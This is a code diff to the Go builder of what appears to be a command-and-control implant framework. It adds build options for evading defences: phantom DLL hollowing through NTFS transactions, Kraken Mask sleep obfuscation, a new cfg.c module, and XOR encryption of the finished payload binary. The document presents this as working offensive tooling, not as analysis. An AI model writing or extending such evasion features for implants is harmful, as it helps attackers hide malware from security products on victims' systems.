@@ -139,6 +139,8 @@ func compileCoff(op, root string, p Params) error {
 		"-DWIN_X64", "-shared", "-Wall", "-Wno-pointer-arith",
 		"-mno-stack-arg-probe", "-fno-zero-initialized-in-bss",
 		"-fasynchronous-unwind-tables", "-mabi=ms", "-foptimize-sibling-calls",
+		"-falign-functions=1", "-falign-jumps=1", "-falign-loops=1",
+		"-Wno-multichar", "-Wno-unused-function", "-Wno-unused-variable", "-Wno-address",
 	}
 
 	// ─── STOMP DLL Support ───────────────────────────────
@@ -159,6 +161,9 @@ func compileCoff(op, root string, p Params) error {
 			case "ntcreatesection + ntmapviewofsection":
 				cflags = append(cflags, "-DSTOMP_TECHNIQUE=1")
 				logInfo(op, "STOMP DLL technique: NtCreateSection + NtMapViewOfSection enabled")
+			case "phantom":
+				cflags = append(cflags, "-DSTOMP_TECHNIQUE=2")
+				logInfo(op, "STOMP DLL technique: Phantom DLL Hollowing (NTFS Transaction) enabled")
 			default:
 				logInfo(op, "STOMP DLL technique: unknown technique %q, defaulting to LoadLibraryEx", p.StompDllTechnique)
 		}
@@ -175,6 +180,9 @@ func compileCoff(op, root string, p Params) error {
 		case "ekko":
 			cflags = append(cflags, "-DSLEEP_OBF_EKKO")
 			logInfo(op, "Sleep obfuscation: Ekko enabled")
+		case "kraken mask":
+			cflags = append(cflags, "-DSLEEP_OBF_KRAKEN_MASK")
+			logInfo(op, "Sleep obfuscation: Kraken Mask enabled")
 		default:
 			logInfo(op, "Sleep obfuscation: unknown technique %q, skipping", p.SleepObfTechnique)
 		}
@@ -191,6 +199,7 @@ func compileCoff(op, root string, p Params) error {
 		{filepath.Join(srcDir, "stomp.c"), filepath.Join(buildDir, "stomp.x64.o")},
 		{filepath.Join(srcDir, "services.c"), filepath.Join(buildDir, "services.x64.o")},
 		{filepath.Join(srcDir, "hooks.c"), filepath.Join(buildDir, "hooks.x64.o")},
+		{filepath.Join(srcDir, "cfg.c"), filepath.Join(buildDir, "cfg.x64.o")},
 	}
 
 	for _, s := range sources {
@@ -208,6 +217,20 @@ func compileCoff(op, root string, p Params) error {
 
 func linkPIC(op, root, dllPath, outPath string) error {
 	return run(op, root, linkTool, loaderSpec, dllPath, outPath)
+}
+
+
+// ─── Xor Encryption ─────────────────────────────────
+func applyXorEncryption(data []byte, key string) []byte {
+	keyBytes := []byte(key)
+	keyLen := len(keyBytes)
+	encrypted := make([]byte, len(data))
+
+	for i, b := range data {
+		encrypted[i] = b ^ keyBytes[i%keyLen]
+	}
+
+	return encrypted
 }
 
 
@@ -346,6 +369,12 @@ func Compile(operator string, builderId string, p Params) []byte {
 		Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, fmt.Sprintf("Build completed in %s", time.Since(start)))
 		logInfo(operator, "Build completed in %s", time.Since(start))
 		output, err := os.ReadFile(binPath)
+
+		if p.Xor {
+			output = applyXorEncryption(output, p.XorKey)
+			Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, fmt.Sprintf("Applied XOR encryption: %v", p.XorKey))
+		}
+
 		if err != nil {
 			Ts.TsAgentBuildLog(builderId, BUILD_LOG_ERROR, fmt.Sprintf("Failed to read final binary: %v", err))
 			return nil
